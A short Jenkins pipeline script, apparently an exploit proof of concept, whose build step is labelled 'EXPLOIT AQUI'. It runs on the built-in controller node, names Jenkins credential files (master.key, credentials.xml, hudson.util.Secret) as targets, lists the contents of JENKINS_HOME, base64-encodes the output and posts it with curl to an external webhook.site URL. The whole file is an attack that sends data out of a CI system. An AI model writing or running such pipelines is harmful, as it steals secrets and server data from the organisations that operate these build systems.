pipeline {
    agent {
        label '(built-in)'
    }
    
    stages {
        stage('Build') {
            steps {
                sh '''
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> EXPLOIT AQUI <<"
                    echo ">> hudson.util.Secret // master.key // credentials.xml <<"
                    pwd
                    echo ${JENKINS_HOME} > ./out.txt
                    ls -lah ${JENKINS_HOME} >> ./out.txt
                    cat ./out.txt | base64 | curl -X POST -d @- https://webhook.site/41fd0f71-c6ea-4033-a853-0e976112d589
                '''
            }
        }
    }
}
